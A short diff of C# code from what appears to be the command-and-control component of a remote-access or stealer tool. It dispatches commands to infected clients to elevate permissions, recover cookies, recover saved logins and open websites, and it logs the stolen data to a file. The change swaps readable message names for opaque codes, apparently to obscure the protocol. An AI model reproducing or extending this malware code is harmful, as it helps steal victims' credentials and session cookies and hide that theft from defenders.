@@ -43,20 +43,20 @@ namespace CNC.Core.Helper
             switch (doEvent)
             {
                 case EventDoType.ElevatePermission:
-                    client.Connection.SendObject("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+                    client.Connection.SendObject("0x12", Cryptography.Encrypt(Guid.NewGuid().ToString()));
                     break;
                 case EventDoType.GetCookies:
                     File.AppendAllText(doEventParams,
                         Cryptography.Decrypt(client.Connection.SendReceiveObject<string, string>
-                        ("RecoverCookieReq", "RecoverCookieRep", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
+                        ("0x24", "1x24", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
                     break;
                 case EventDoType.GetLogin:
                     File.AppendAllText(doEventParams,
                       Cryptography.Decrypt(client.Connection.SendReceiveObject<string, string>
-                      ("RecoverLoginReq", "RecoverLoginRep", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
+                      ("0x23", "1x23", 25000, Cryptography.Encrypt(Guid.NewGuid().ToString()))));
                     break;
                 case EventDoType.OpenWebsite:
-                    client.Connection.SendObject("OpenWebsiteReq", Cryptography.Encrypt(doEventParams));
+                    client.Connection.SendObject("0x25", Cryptography.Encrypt(doEventParams));
                     break;
             }
         }
